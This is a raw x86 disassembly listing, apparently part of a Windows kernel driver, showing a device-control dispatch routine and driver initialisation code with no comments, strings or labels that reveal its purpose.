   18ba0:	mov    DWORD PTR [esi+0x8],ecx
   18ba3:	push   DWORD PTR [ebp-0x5c]
   18ba6:	call   0x1d9f8
   18bab:	push   DWORD PTR [ebp-0x24]
   18bae:	call   0x1d9f8
   18bb3:	push   DWORD PTR [ebp-0x2c]
   18bb6:	call   0x1d9f8
   18bbb:	push   DWORD PTR [ebp-0x34]
   18bbe:	call   0x1d9f8
   18bc3:	push   DWORD PTR [ebp-0x3c]
   18bc6:	call   0x1d9f8
   18bcb:	push   DWORD PTR [ebp-0x44]
   18bce:	call   0x1d9f8
   18bd3:	add    esp,0x18
   18bd6:	jmp    0x18be9
   18bd8:	xor    eax,eax
   18bda:	inc    eax
   18bdb:	ret    
   18bdc:	mov    esp,DWORD PTR [ebp-0x18]
   18bdf:	mov    eax,DWORD PTR [ebp+0x8]
   18be2:	mov    DWORD PTR [eax+0x8],0x4
   18be9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18bf0:	push   0x0
   18bf2:	push   0x7e560
   18bf7:	call   DWORD PTR ds:0x1ee24
   18bfd:	call   0x1dafd
   18c02:	ret    0x4
   18c05:	int3   
   18c06:	int3   
   18c07:	int3   
   18c08:	int3   
   18c09:	int3   
   18c0a:	push   0x2c
   18c0c:	push   0x7e1a8
   18c11:	call   0x1dab8
   18c16:	xor    edi,edi
   18c18:	mov    DWORD PTR [ebp-0x24],edi
   18c1b:	mov    ebx,DWORD PTR [ebp+0xc]
   18c1e:	mov    DWORD PTR [ebx+0x18],edi
   18c21:	mov    DWORD PTR [ebx+0x1c],edi
   18c24:	mov    eax,DWORD PTR [ebx+0x60]
   18c27:	cmp    BYTE PTR [eax],0xe
   18c2a:	jne    0x190ca
   18c30:	mov    eax,DWORD PTR [eax+0xc]
   18c33:	mov    DWORD PTR [ebx+0x1c],0x84c
   18c3a:	mov    ecx,0x22c068
   18c3f:	cmp    eax,ecx
   18c41:	ja     0x18f7b
   18c47:	je     0x18f6c
   18c4d:	add    ecx,0xffffffd0
   18c50:	cmp    eax,ecx
   18c52:	ja     0x18d6f
   18c58:	je     0x18d56
   18c5e:	sub    eax,0x22c020
   18c63:	je     0x18d20
   18c69:	push   0x4
   18c6b:	pop    esi
   18c6c:	sub    eax,esi
   18c6e:	je     0x18cea
   18c70:	sub    eax,esi
   18c72:	je     0x18ccf
   18c74:	sub    eax,esi
   18c76:	je     0x18cc2
   18c78:	sub    eax,esi
   18c7a:	je     0x18c91
   18c7c:	sub    eax,esi
   18c7e:	jne    0x1906a
   18c84:	push   DWORD PTR [ebx+0xc]
   18c87:	call   0x1794a
   18c8c:	jmp    0x190c7
   18c91:	mov    esi,DWORD PTR [ebx+0xc]
   18c94:	mov    eax,DWORD PTR [esi]
   18c96:	add    eax,0x28
   18c99:	mov    DWORD PTR [ebx+0x1c],eax
   18c9c:	push   0xffffffff
   18c9e:	lea    eax,[esi+0x28]
   18ca1:	push   eax
   18ca2:	lea    ecx,[ebp-0x34]
   18ca5:	call   0x1109a
   18caa:	push   esi
   18cab:	lea    eax,[ebp-0x34]
   18cae:	push   eax
   18caf:	call   0x167fc
   18cb4:	push   DWORD PTR [ebp-0x34]
   18cb7:	call   0x1d9f8
   18cbc:	pop    ecx
   18cbd:	jmp    0x190ca
   18cc2:	push   DWORD PTR [ebx+0xc]
   18cc5:	call   0x18a98
   18cca:	jmp    0x190c7
   18ccf:	mov    ecx,DWORD PTR ds:0x7eee8
   18cd5:	call   0x16ada
   18cda:	mov    ecx,DWORD PTR ds:0x7e5bc
   18ce0:	call   0x16b96
   18ce5:	jmp    0x190ca
   18cea:	mov    eax,DWORD PTR [ebx+0xc]
   18ced:	mov    DWORD PTR [ebx+0x1c],0x10
   18cf4:	mov    ecx,DWORD PTR [eax]
   18cf6:	cmp    ecx,edi
   18cf8:	jl     0x190ca
   18cfe:	cmp    ecx,0x6
   18d01:	jge    0x190ca
   18d07:	mov    edx,DWORD PTR [eax+0x8]
   18d0a:	mov    DWORD PTR [ecx*8+0x7ef38],edx
   18d11:	mov    eax,DWORD PTR [eax+0xc]
   18d14:	mov    DWORD PTR [ecx*8+0x7ef3c],eax
   18d1b:	jmp    0x190ca
   18d20:	mov    eax,DWORD PTR [ebx+0xc]
   18d23:	mov    DWORD PTR [ebx+0x1c],0x10
   18d2a:	mov    ecx,DWORD PTR [eax]
   18d2c:	cmp    ecx,edi
   18d2e:	jl     0x190ca
   18d34:	cmp    ecx,0x6
   18d37:	jge    0x190ca
   18d3d:	mov    edx,DWORD PTR [ecx*8+0x7ef38]
   18d44:	mov    DWORD PTR [eax+0x8],edx
   18d47:	mov    ecx,DWORD PTR [ecx*8+0x7ef3c]
   18d4e:	mov    DWORD PTR [eax+0xc],ecx
   18d51:	jmp    0x190ca
   18d56:	mov    eax,DWORD PTR [ebx+0xc]
   18d59:	mov    ecx,DWORD PTR [eax]
   18d5b:	add    ecx,0xc
   18d5e:	mov    DWORD PTR [ebx+0x1c],ecx
   18d61:	push   eax
   18d62:	push   DWORD PTR [eax+0x4]
   18d65:	call   0x15f6c
   18d6a:	jmp    0x190ca
   18d6f:	sub    eax,0x22c03c
   18d74:	je     0x18ee8
   18d7a:	sub    eax,0x10
   18d7d:	je     0x18ede
   18d83:	push   0x4
   18d85:	pop    esi
   18d86:	sub    eax,esi
   18d88:	je     0x18dde
   18d8a:	sub    eax,0xc
   18d8d:	je     0x18dc6
   18d8f:	sub    eax,esi
   18d91:	je     0x18da8
   18d93:	sub    eax,esi
   18d95:	jne    0x1906a
   18d9b:	push   DWORD PTR [ebx+0xc]
   18d9e:	call   0x1284a
   18da3:	jmp    0x190c7
   18da8:	mov    DWORD PTR [ebx+0x1c],0x8
   18daf:	mov    ebx,DWORD PTR [ebx+0xc]
   18db2:	mov    eax,ds:0x7ef1c
   18db7:	mov    DWORD PTR [ebx],eax
   18db9:	mov    eax,ds:0x7ef20
   18dbe:	mov    DWORD PTR [ebx+0x4],eax
   18dc1:	jmp    0x190ca
   18dc6:	mov    eax,DWORD PTR [ebx+0xc]
   18dc9:	mov    ecx,DWORD PTR [eax]
   18dcb:	mov    DWORD PTR ds:0x7ef1c,ecx
   18dd1:	mov    eax,DWORD PTR [eax+0x4]
   18dd4:	mov    ds:0x7ef20,eax
   18dd9:	jmp    0x190c7
   18dde:	mov    DWORD PTR [ebx+0x1c],edi
   18de1:	mov    esi,DWORD PTR [ebx+0xc]
   18de4:	mov    DWORD PTR [ebp-0x20],esi
   18de7:	push   0xffffffff
   18de9:	push   0x1ded0
   18dee:	lea    ecx,[ebp-0x2c]
   18df1:	call   0x1109a
   18df6:	xor    edi,edi
   18df8:	inc    edi
   18df9:	mov    DWORD PTR [esi+0x8],edi
   18dfc:	xor    eax,eax
   18dfe:	push   eax
   18dff:	push   eax
   18e00:	push   eax
   18e01:	push   eax
   18e02:	push   0x7e560
   18e07:	call   DWORD PTR ds:0x1ee28
   18e0d:	test   eax,eax
   18e0f:	jge    0x18e19
   18e11:	push   DWORD PTR [ebp-0x2c]
   18e14:	jmp    0x18cb7
   18e19:	and    DWORD PTR [ebp-0x4],0x0
   18e1d:	mov    DWORD PTR [ebp-0x4],edi
   18e20:	mov    eax,DWORD PTR [esi]
   18e22:	add    eax,0x28
   18e25:	mov    DWORD PTR [ebx+0x1c],eax
   18e28:	mov    eax,ds:0x7eee8
   18e2d:	mov    ebx,DWORD PTR [eax+0x4]
   18e30:	mov    eax,DWORD PTR [ebx]
   18e32:	mov    DWORD PTR [ebp+0xc],eax
   18e35:	and    DWORD PTR [ebp-0x1c],0x0
   18e39:	mov    edi,DWORD PTR [esi+0x28]
   18e3c:	cmp    DWORD PTR [ebp-0x1c],edi
   18e3f:	jge    0x18e53
   18e41:	cmp    DWORD PTR [ebp+0xc],ebx
   18e44:	je     0x18e53
   18e46:	lea    ecx,[ebp+0xc]
   18e49:	call   0x1385c
   18e4e:	inc    DWORD PTR [ebp-0x1c]
   18e51:	jmp    0x18e3c
   18e53:	mov    eax,DWORD PTR [ebp+0xc]
   18e56:	cmp    eax,ebx
   18e58:	je     0x18e6c
   18e5a:	and    DWORD PTR [esi+0x8],0x0
   18e5e:	add    eax,0x10
   18e61:	push   eax
   18e62:	lea    ecx,[ebp-0x2c]
   18e65:	call   0x1299c
   18e6a:	jmp    0x18e73
   18e6c:	mov    DWORD PTR [esi+0x8],0x1
   18e73:	and    DWORD PTR [esi+0x4],0x0
   18e77:	and    DWORD PTR [ebp-0x4],0x0
   18e7b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18e82:	call   0x18ed0
   18e87:	cmp    DWORD PTR [esi+0x8],0x0
   18e8b:	jne    0x18e11
   18e8d:	push   esi
   18e8e:	lea    eax,[ebp-0x2c]
   18e91:	push   eax
   18e92:	call   0x167fc
   18e97:	jmp    0x18e11
   18e9c:	xor    eax,eax
   18e9e:	inc    eax
   18e9f:	ret    
   18ea0:	mov    esp,DWORD PTR [ebp-0x18]
   18ea3:	mov    eax,DWORD PTR [ebp-0x20]
   18ea6:	mov    DWORD PTR [eax+0x8],0x4
   18ead:	push   DWORD PTR [ebp-0x2c]
   18eb0:	call   0x1d9f8
   18eb5:	push   0xfffffffe
   18eb7:	lea    eax,[ebp-0x10]
   18eba:	push   eax
   18ebb:	push   0x7e528
   18ec0:	call   0x1dc7c
   18ec5:	add    esp,0x10
   18ec8:	jmp    0x190ca
   18ecd:	mov    esi,DWORD PTR [ebp-0x20]
   18ed0:	push   0x0
   18ed2:	push   0x7e560
   18ed7:	call   DWORD PTR ds:0x1ee24
   18edd:	ret    
   18ede:	call   0x12374
   18ee3:	jmp    0x190ca
   18ee8:	mov    eax,DWORD PTR [ebx+0xc]
   18eeb:	mov    ecx,DWORD PTR ds:0x7e404
   18ef1:	mov    esi,eax
   18ef3:	sub    esi,ecx
   18ef5:	push   0x2
   18ef7:	pop    edi
   18ef8:	movzx  edx,WORD PTR [ecx]
   18efb:	mov    WORD PTR [esi+ecx*1],dx
   18eff:	add    ecx,edi
   18f01:	test   dx,dx
   18f04:	jne    0x18ef8
   18f06:	mov    ecx,0x7e448
   18f0b:	lea    esi,[eax+0x50]
   18f0e:	sub    esi,ecx
   18f10:	movzx  edx,WORD PTR [ecx]
   18f13:	mov    WORD PTR [esi+ecx*1],dx
   18f17:	add    ecx,edi
   18f19:	test   dx,dx
   18f1c:	jne    0x18f10
   18f1e:	mov    ecx,0x7e408
   18f23:	lea    esi,[eax+0x90]
   18f29:	sub    esi,ecx
   18f2b:	movzx  edx,WORD PTR [ecx]
   18f2e:	mov    WORD PTR [esi+ecx*1],dx
   18f32:	add    ecx,edi
   18f34:	test   dx,dx
   18f37:	jne    0x18f2b
   18f39:	mov    ecx,0x7e488
   18f3e:	lea    esi,[eax+0xd0]
   18f44:	sub    esi,ecx
   18f46:	movzx  edx,WORD PTR [ecx]
   18f49:	mov    WORD PTR [esi+ecx*1],dx
   18f4d:	add    ecx,edi
   18f4f:	test   dx,dx
   18f52:	jne    0x18f46
   18f54:	lea    edi,[eax+0x40]
   18f57:	mov    esi,0x7a44c
   18f5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18f60:	mov    DWORD PTR [ebx+0x1c],0x110
   18f67:	jmp    0x190ca
   18f6c:	mov    eax,DWORD PTR [ebx+0xc]
   18f6f:	push   DWORD PTR [eax]
   18f71:	call   0x10fc4
   18f76:	jmp    0x190c7
   18f7b:	mov    ecx,0x22c088
   18f80:	cmp    eax,ecx
   18f82:	ja     0x1904c
   18f88:	je     0x19021
   18f8e:	sub    eax,0x22c06c
   18f93:	je     0x19009
   18f95:	push   0x4
   18f97:	pop    esi
   18f98:	sub    eax,esi
   18f9a:	je     0x18ffc
   18f9c:	push   0x8
   18f9e:	pop    ecx
   18f9f:	sub    eax,ecx
   18fa1:	je     0x18fef
   18fa3:	sub    eax,esi
   18fa5:	je     0x18fd7
   18fa7:	sub    eax,esi
   18fa9:	je     0x18fc0
   18fab:	sub    eax,esi
   18fad:	jne    0x1906a
   18fb3:	push   DWORD PTR [ebx+0xc]
   18fb6:	call   0x17854
   18fbb:	jmp    0x190c7
   18fc0:	mov    DWORD PTR [ebx+0x1c],ecx
   18fc3:	mov    ebx,DWORD PTR [ebx+0xc]
   18fc6:	mov    eax,ds:0x7ef24
   18fcb:	mov    DWORD PTR [ebx],eax
   18fcd:	mov    eax,ds:0x7ef28
   18fd2:	jmp    0x18dbe
   18fd7:	mov    eax,DWORD PTR [ebx+0xc]
   18fda:	mov    ecx,DWORD PTR [eax]
   18fdc:	mov    DWORD PTR ds:0x7ef24,ecx
   18fe2:	mov    eax,DWORD PTR [eax+0x4]
   18fe5:	mov    ds:0x7ef28,eax
   18fea:	jmp    0x190c7
   18fef:	push   DWORD PTR [ebx+0xc]
   18ff2:	call   0x17068
   18ff7:	jmp    0x190c7
   18ffc:	push   DWORD PTR [ebx+0xc]
   18fff:	call   0x10f34
   19004:	jmp    0x190c7
   19009:	mov    esi,DWORD PTR [ebx+0xc]
   1900c:	push   DWORD PTR [esi]
   1900e:	call   0x11008
   19013:	mov    DWORD PTR [esi],eax
   19015:	mov    DWORD PTR [ebx+0x1c],0x4
   1901c:	jmp    0x190ca
   19021:	mov    esi,DWORD PTR [ebx+0xc]
   19024:	mov    eax,DWORD PTR [esi]
   19026:	add    eax,0xc
   19029:	mov    DWORD PTR [ebx+0x1c],eax
   1902c:	push   0xffffffff
   1902e:	lea    eax,[esi+0xc]
   19031:	push   eax
   19032:	lea    ecx,[ebp-0x3c]
   19035:	call   0x1109a
   1903a:	push   esi
   1903b:	lea    eax,[ebp-0x3c]
   1903e:	push   eax
   1903f:	call   0x15e82
   19044:	push   DWORD PTR [ebp-0x3c]
   19047:	jmp    0x18cb7
   1904c:	sub    eax,0x22c08c
   19051:	je     0x190b9
   19053:	push   0x4
   19055:	pop    esi
   19056:	sub    eax,esi
   19058:	je     0x190a5
   1905a:	sub    eax,esi
   1905c:	je     0x1909e
   1905e:	sub    eax,esi
   19060:	je     0x1908a
   19062:	sub    eax,esi
   19064:	je     0x19080
   19066:	sub    eax,esi
   19068:	je     0x19073
   1906a:	mov    DWORD PTR [ebp-0x24],0xc0000010
   19071:	jmp    0x190c7
   19073:	push   DWORD PTR [ebx+0xc]
   19076:	call   0x1aa34
   1907b:	mov    DWORD PTR [ebx+0x1c],esi
   1907e:	jmp    0x190ca
   19080:	push   DWORD PTR [ebx+0xc]
   19083:	call   0x1b4dc
   19088:	jmp    0x190c7
   1908a:	mov    eax,DWORD PTR [ebx+0xc]
   1908d:	mov    ecx,DWORD PTR [eax+0x4]
   19090:	add    ecx,0x8
   19093:	mov    DWORD PTR [ebx+0x1c],ecx
   19096:	push   eax
   19097:	call   0x1b7aa
   1909c:	jmp    0x190ca
   1909e:	call   0x1b3ec
   190a3:	jmp    0x190c7
   190a5:	mov    eax,DWORD PTR [ebx+0xc]
   190a8:	mov    ecx,DWORD PTR [eax+0x4]
   190ab:	add    ecx,0x8
   190ae:	mov    DWORD PTR [ebx+0x1c],ecx
   190b1:	push   eax
   190b2:	call   0x1a80c
   190b7:	jmp    0x190ca
   190b9:	push   DWORD PTR [ebx+0xc]
   190bc:	call   0x11050
   190c1:	push   eax
   190c2:	call   0x1b60e
   190c7:	mov    DWORD PTR [ebx+0x1c],edi
   190ca:	mov    eax,DWORD PTR [ebp-0x24]
   190cd:	call   0x1dafd
   190d2:	ret    0x8
   190d5:	int3   
   190d6:	int3   
   190d7:	int3   
   190d8:	int3   
   190d9:	int3   
   190da:	push   0xc
   190dc:	push   0x7e1d0
   190e1:	call   0x1dab8
   190e6:	and    DWORD PTR [ebp-0x4],0x0
   190ea:	push   DWORD PTR [ebp+0xc]
   190ed:	push   DWORD PTR [ebp+0x8]
   190f0:	call   0x18c0a
   190f5:	mov    esi,eax
   190f7:	jmp    0x1910c
   190f9:	xor    eax,eax
   190fb:	inc    eax
   190fc:	ret    
   190fd:	mov    esp,DWORD PTR [ebp-0x18]
   19100:	push   0xd
   19102:	call   0x10fc4
   19107:	mov    esi,0xc0000001
   1910c:	mov    DWORD PTR [ebp-0x1c],esi
   1910f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   19116:	cmp    esi,0x103
   1911c:	je     0x1912c
   1911e:	mov    ecx,DWORD PTR [ebp+0xc]
   19121:	mov    DWORD PTR [ecx+0x18],esi
   19124:	xor    dl,dl
   19126:	call   DWORD PTR ds:0x1ee44
   1912c:	mov    eax,esi
   1912e:	call   0x1dafd
   19133:	ret    0x8
   19136:	int3   
   19137:	int3   
   19138:	int3   
   19139:	int3   
   1913a:	int3   
   1913b:	int3   
   1913c:	mov    edi,edi
   1913e:	push   ebp
   1913f:	mov    ebp,esp
   19141:	push   esi
   19142:	mov    esi,ecx
   19144:	mov    BYTE PTR [esi+0x8],0x0
   19148:	call   0x14ab2
   1914d:	lea    ecx,[esi+0x10]
   19150:	mov    BYTE PTR [ecx+0x8],0x0
   19154:	call   0x144a2
   19159:	mov    eax,DWORD PTR [ebp+0x8]
   1915c:	mov    DWORD PTR [esi+0x20],eax
   1915f:	mov    eax,DWORD PTR [ebp+0xc]
   19162:	mov    DWORD PTR [esi+0x24],eax
   19165:	mov    eax,esi
   19167:	pop    esi
   19168:	pop    ebp
   19169:	ret    0x8
   1916c:	int3   
   1916d:	int3   
   1916e:	int3   
   1916f:	int3   
   19170:	int3   
   19171:	int3   
   19172:	push   0x850
   19177:	push   0x7e1f0
   1917c:	call   0x1ddc0
   19181:	mov    esi,DWORD PTR [ebp+0x8]
   19184:	mov    DWORD PTR [ebp-0x828],esi
   1918a:	mov    edi,DWORD PTR [ebp+0xc]
   1918d:	call   0x1839e
   19192:	call   0x11cd4
   19197:	test   eax,eax
   19199:	je     0x19677
   1919f:	xor    ebx,ebx
   191a1:	mov    DWORD PTR [ebp-0x838],ebx
   191a7:	call   0x1820e
   191ac:	cmp    al,bl
   191ae:	jne    0x1929f
   191b4:	mov    DWORD PTR [ebp-0x4],ebx
   191b7:	push   ebx
   191b8:	push   0x19
   191ba:	call   0x109dc
   191bf:	cmp    edx,ebx
   191c1:	jl     0x191d7
   191c3:	jg     0x191ca
   191c5:	cmp    eax,0x5
   191c8:	jbe    0x191d7
   191ca:	push   ebx
   191cb:	push   0x7eec0
   191d0:	call   0x11c02
   191d5:	call   eax
   191d7:	push   edi
   191d8:	push   0x1ebc4
   191dd:	lea    eax,[ebp-0x41c]
   191e3:	push   eax
   191e4:	call   0x1daaa
   191e9:	add    esp,0xc
   191ec:	lea    eax,[ebp-0x858]
   191f2:	push   eax
   191f3:	call   DWORD PTR ds:0x1ee4c
   191f9:	push   0x1eb94
   191fe:	push   0x4
   19200:	push   0x1eb8a
   19205:	call   0x16c50
   1920a:	mov    DWORD PTR [ebp-0x82c],eax
   19210:	lea    ecx,[eax+0x2]
   19213:	mov    dx,WORD PTR [eax]
   19216:	inc    eax
   19217:	inc    eax
   19218:	cmp    dx,bx
   1921b:	jne    0x19213
   1921d:	sub    eax,ecx
   1921f:	sar    eax,1
   19221:	add    eax,eax
   19223:	mov    WORD PTR [ebp-0x82e],ax
   1922a:	mov    WORD PTR [ebp-0x830],ax
   19231:	mov    DWORD PTR [ebp-0x850],0x18
   1923b:	mov    DWORD PTR [ebp-0x84c],ebx
   19241:	mov    DWORD PTR [ebp-0x844],0x40
   1924b:	lea    eax,[ebp-0x830]
   19251:	mov    DWORD PTR [ebp-0x848],eax
   19257:	mov    DWORD PTR [ebp-0x840],ebx
   1925d:	mov    DWORD PTR [ebp-0x83c],ebx
   19263:	mov    eax,DWORD PTR [ebp-0x82c]
   19269:	lea    ecx,[eax+0x2]
   1926c:	mov    dx,WORD PTR [eax]
   1926f:	inc    eax
   19270:	inc    eax
   19271:	cmp    dx,bx
   19274:	jne    0x1926c
   19276:	sub    eax,ecx
   19278:	sar    eax,1
   1927a:	mov    DWORD PTR [ebp-0x838],eax
   19280:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   19287:	jmp    0x1929f
   19289:	xor    eax,eax
   1928b:	inc    eax
   1928c:	ret    
   1928d:	mov    esp,DWORD PTR [ebp-0x18]
   19290:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   19297:	xor    ebx,ebx
   19299:	mov    esi,DWORD PTR [ebp-0x828]
   1929f:	cmp    DWORD PTR [ebp-0x838],ebx
   192a5:	jne    0x19677
   192ab:	xor    eax,eax
   192ad:	lea    edi,[ebp-0x840]
   192b3:	stos   DWORD PTR es:[edi],eax
   192b4:	stos   DWORD PTR es:[edi],eax
   192b5:	mov    DWORD PTR [ebp-0x844],0xc
   192bf:	mov    DWORD PTR [ebp-0x840],0x2
   192c9:	mov    BYTE PTR [ebp-0x83c],bl
   192cf:	mov    BYTE PTR [ebp-0x83b],bl
   192d5:	push   0x7e580
   192da:	push   ebx
   192db:	lea    eax,[ebp-0x844]
   192e1:	push   eax
   192e2:	call   0x11caa
   192e7:	call   eax
   192e9:	push   eax
   192ea:	call   0x11b84
   192ef:	call   eax
   192f1:	push   0x10
   192f3:	call   0x10a52
   192f8:	pop    ecx
   192f9:	cmp    eax,ebx
   192fb:	je     0x19319
   192fd:	lea    ecx,[ebp-0x81d]
   19303:	push   ecx
   19304:	lea    ecx,[ebp-0x81d]
   1930a:	push   ecx
   1930b:	mov    ecx,eax
   1930d:	call   0x16e3c
   19312:	mov    ds:0x7eee8,eax
   19317:	jmp    0x1931f
   19319:	mov    DWORD PTR ds:0x7eee8,ebx
   1931f:	push   0x2c
   19321:	call   0x10a52
   19326:	pop    ecx
   19327:	cmp    eax,ebx
   19329:	je     0x19340
   1932b:	push   0x5dc
   19330:	push   0x14
   19332:	mov    ecx,eax
   19334:	call   0x18636
   19339:	mov    ds:0x7eef0,eax
   1933e:	jmp    0x19346
   19340:	mov    DWORD PTR ds:0x7eef0,ebx
   19346:	push   0x10
   19348:	call   0x10a52
   1934d:	pop    ecx
   1934e:	cmp    eax,ebx
   19350:	je     0x1936e
   19352:	lea    ecx,[ebp-0x81d]
   19358:	push   ecx
   19359:	lea    ecx,[ebp-0x81d]
   1935f:	push   ecx
   19360:	mov    ecx,eax
   19362:	call   0x16a1a
   19367:	mov    ds:0x7e530,eax
   1936c:	jmp    0x19374
   1936e:	mov    DWORD PTR ds:0x7e530,ebx
   19374:	push   0x10
   19376:	call   0x10a52
   1937b:	pop    ecx
   1937c:	cmp    eax,ebx
   1937e:	je     0x1939c
   19380:	lea    ecx,[ebp-0x81d]
   19386:	push   ecx
   19387:	lea    ecx,[ebp-0x81d]
   1938d:	push   ecx
   1938e:	mov    ecx,eax
   19390:	call   0x16f00
   19395:	mov    ds:0x7e5bc,eax
   1939a:	jmp    0x193a2
   1939c:	mov    DWORD PTR ds:0x7e5bc,ebx
   193a2:	push   0x28
   193a4:	call   0x10a52
   193a9:	pop    ecx
   193aa:	cmp    eax,ebx
   193ac:	je     0x193c3
   193ae:	push   0x3e8
   193b3:	push   0x14
   193b5:	mov    ecx,eax
   193b7:	call   0x1913c
   193bc:	mov    ds:0x7e55c,eax
   193c1:	jmp    0x193c9
   193c3:	mov    DWORD PTR ds:0x7e55c,ebx
   193c9:	push   0x20
   193cb:	call   0x10a52
   193d0:	pop    ecx
   193d1:	cmp    eax,ebx
   193d3:	je     0x193e3
   193d5:	mov    ecx,eax
   193d7:	call   0x16bde
   193dc:	mov    ds:0x7e558,eax
   193e1:	jmp    0x193e9
   193e3:	mov    DWORD PTR ds:0x7e558,ebx
   193e9:	call   0x12932
   193ee:	call   0x1b576
   193f3:	call   0x179fa
   193f8:	mov    edi,0x1eb7a
   193fd:	push   edi
   193fe:	call   0x1855a
   19403:	push   eax
   19404:	push   0x1eb48
   19409:	push   0xa
   1940b:	push   0x1eb32
   19410:	call   0x16c50
   19415:	push   eax
   19416:	lea    eax,[ebp-0x81c]
   1941c:	push   eax
   1941d:	call   0x1da9e
   19422:	add    esp,0xc
   19425:	lea    eax,[ebp-0x81c]
   1942b:	push   eax
   1942c:	lea    eax,[ebp-0x860]
   19432:	push   eax
   19433:	call   0x11c2c
   19438:	call   eax
   1943a:	push   edi
   1943b:	call   0x1855a
   19440:	push   eax
   19441:	push   0x1eb02
   19446:	push   0xe
   19448:	push   0x1eae4
   1944d:	call   0x16c50
   19452:	push   eax
   19453:	lea    eax,[ebp-0x41c]
   19459:	push   eax
   1945a:	call   0x1da9e
   1945f:	add    esp,0xc
   19462:	lea    eax,[ebp-0x41c]
   19468:	push   eax
   19469:	lea    eax,[ebp-0x858]
   1946f:	push   eax
   19470:	call   0x11c2c
   19475:	call   eax
   19477:	push   0x7ef2c
   1947c:	push   ebx
   1947d:	push   0x100
   19482:	push   0x22
   19484:	lea    eax,[ebp-0x860]
   1948a:	push   eax
   1948b:	push   ebx
   1948c:	push   esi
   1948d:	call   0x11b5a
   19492:	call   eax
   19494:	cmp    eax,ebx
   19496:	jl     0x19679
   1949c:	mov    eax,0x190da
   194a1:	mov    DWORD PTR [esi+0x94],eax
   194a7:	mov    DWORD PTR [esi+0x90],eax
   194ad:	mov    DWORD PTR [esi+0xa4],eax
   194b3:	mov    DWORD PTR [esi+0x70],eax
   194b6:	mov    DWORD PTR [esi+0x48],eax
   194b9:	mov    DWORD PTR [esi+0x44],eax
   194bc:	mov    DWORD PTR [esi+0x40],eax
   194bf:	mov    DWORD PTR [esi+0x38],eax
   194c2:	mov    eax,ds:0x7ef2c
   194c7:	or     DWORD PTR [eax+0x1c],0x4
   194cb:	lea    eax,[ebp-0x860]
   194d1:	push   eax
   194d2:	lea    eax,[ebp-0x858]
   194d8:	push   eax
   194d9:	call   0x11b30
   194de:	call   eax
   194e0:	mov    DWORD PTR [ebp-0x828],eax
   194e6:	cmp    eax,ebx
   194e8:	jge    0x194ff
   194ea:	push   DWORD PTR [esi+0x4]
   194ed:	call   0x119e0
   194f2:	call   eax
   194f4:	mov    eax,DWORD PTR [ebp-0x828]
   194fa:	jmp    0x19679
   194ff:	push   ebx
   19500:	push   0x7eec0
   19505:	call   0x11c02
   1950a:	call   eax
   1950c:	push   ebx
   1950d:	push   0x7e560
   19512:	call   0x11c02
   19517:	call   eax
   19519:	push   ebx
   1951a:	push   0x7e534
   1951f:	call   0x11c02
   19524:	call   eax
   19526:	push   0x8000000
   1952b:	push   0x1eabc
   19530:	push   0x9
   19532:	push   0x1e75e
   19537:	call   0x16d46
   1953c:	push   eax
   1953d:	lea    eax,[ebp-0x824]
   19543:	push   eax
   19544:	call   0x19ab2
   19549:	push   DWORD PTR [ebp-0x824]
   1954f:	call   0x11866
   19554:	call   eax
   19556:	mov    DWORD PTR [ebp-0x834],eax
   1955c:	push   ebx
   1955d:	push   0x1ea9a
   19562:	push   0x16
   19564:	push   0x1ea82
   19569:	call   0x16d46
   1956e:	push   eax
   1956f:	push   DWORD PTR [ebp-0x824]
   19575:	call   0x19998
   1957a:	push   eax
   1957b:	push   DWORD PTR [ebp-0x834]
   19581:	call   0x1993e
   19586:	mov    edi,eax
   19588:	add    edi,DWORD PTR [ebp-0x824]
   1958e:	mov    esi,0x1ded2
   19593:	push   esi
   19594:	call   0x115c2
   19599:	mov    DWORD PTR [ebp-0x82c],eax
   1959f:	push   edi
   195a0:	call   0x198e6
   195a5:	mov    ecx,DWORD PTR [ebp-0x82c]
   195ab:	mov    ecx,DWORD PTR [ecx]
   195ad:	mov    eax,DWORD PTR [ecx+eax*4]
   195b0:	mov    ds:0x7eeec,eax
   195b5:	push   ebx
   195b6:	push   0x1ea42
   195bb:	push   0x14
   195bd:	push   0x1ea2c
   195c2:	call   0x16d46
   195c7:	push   eax
   195c8:	push   DWORD PTR [ebp-0x824]
   195ce:	call   0x19998
   195d3:	push   eax
   195d4:	push   DWORD PTR [ebp-0x834]
   195da:	call   0x1993e
   195df:	mov    edi,eax
   195e1:	add    edi,DWORD PTR [ebp-0x824]
   195e7:	push   esi
   195e8:	call   0x115c2
   195ed:	mov    DWORD PTR [ebp-0x82c],eax
   195f3:	push   edi
   195f4:	call   0x198e6
   195f9:	mov    ecx,DWORD PTR [ebp-0x82c]
   195ff:	mov    ecx,DWORD PTR [ecx]
   19601:	mov    eax,DWORD PTR [ecx+eax*4]
   19604:	mov    ds:0x7eee0,eax
   19609:	push   ebx
   1960a:	push   0x1ea08
   1960f:	push   0xe
   19611:	push   0x1e9f8
   19616:	call   0x16d46
   1961b:	push   eax
   1961c:	push   DWORD PTR [ebp-0x824]
   19622:	call   0x19998
   19627:	push   eax
   19628:	push   DWORD PTR [ebp-0x834]
   1962e:	call   0x1993e
   19633:	mov    edi,eax
   19635:	add    edi,DWORD PTR [ebp-0x824]
   1963b:	push   esi
   1963c:	call   0x115c2
   19641:	mov    esi,eax
   19643:	push   edi
   19644:	call   0x198e6
   19649:	mov    ecx,DWORD PTR [esi]
   1964b:	mov    eax,DWORD PTR [ecx+eax*4]
   1964e:	mov    ds:0x7eef4,eax
   19653:	push   DWORD PTR [ebp-0x824]
   19659:	call   0x19c08
   1965e:	push   ebx
   1965f:	push   0x19
   19661:	call   0x109dc
   19666:	call   0x1889e
   1966b:	mov    BYTE PTR ds:0x7ef30,0x1
   19672:	jmp    0x194f4
   19677:	xor    eax,eax
   19679:	call   0x1de08
   1967e:	ret    0x8
   19681:	int3   
   19682:	int3   
   19683:	int3   
   19684:	int3   
   19685:	int3   
   19686:	mov    edi,edi
   19688:	push   ebp
   19689:	mov    ebp,esp
   1968b:	push   ecx
   1968c:	mov    ecx,DWORD PTR [ebp+0x8]
